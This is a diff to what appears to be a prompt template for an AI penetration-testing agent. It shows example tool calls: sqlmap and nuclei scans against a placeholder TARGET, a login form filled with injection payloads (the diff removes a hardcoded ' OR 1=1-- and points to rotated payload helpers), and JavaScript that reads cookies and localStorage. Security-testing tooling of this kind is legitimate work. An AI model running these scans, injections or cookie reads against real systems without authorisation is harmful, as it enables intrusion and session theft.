@@ -90,8 +90,11 @@ shell_exec:
   {{"tool":"shell_exec","args":{{"command":"sqlmap -u 'http://TARGET/endpoint?q=1' --batch --level=2 --risk=2","timeout":120}}}}
   {{"tool":"shell_exec","args":{{"command":"nuclei -u http://TARGET -t /root/nuclei-templates/http/cves/ -silent -nc","timeout":60}}}}
 
-browser_fill_form (login with SQLi):
-  {{"tool":"browser_fill_form","args":{{"form_selector":"form","fields":{{"email":"' OR 1=1--","password":"x"}},"submit_selector":"#loginButton"}}}}
+browser_fill_form (DOM-first — call browser_analyze_dom FIRST to read the real form selector + field names, do NOT guess):
+  1) {{"tool":"browser_analyze_dom","args":{{}}}}                  ← inspect forms[] / inputs[] (name, id, type, placeholder, aria-label)
+  2) {{"tool":"browser_fill_form","args":{{"form_selector":"<from step 1>","fields":{{"<field_from_step_1>":"<value>"}},"submit_selector":"<from step 1>"}}}}
+  If result.ok=False with error="fields_not_found", re-read data.tried_selectors and data.failed, then call browser_analyze_dom again — try different field_name keys (e.g. 'email' vs 'Email' vs 'userid' vs 'login').
+  For injection payloads on login, use round-rotated strings from test_injection/test_xss — do NOT hardcode ' OR 1=1-- in this tool.
 
 browser_eval_js:
   {{"tool":"browser_eval_js","args":{{"expression":"JSON.stringify({{localStorage: Object.keys(localStorage), cookies: document.cookie}})"}}}}
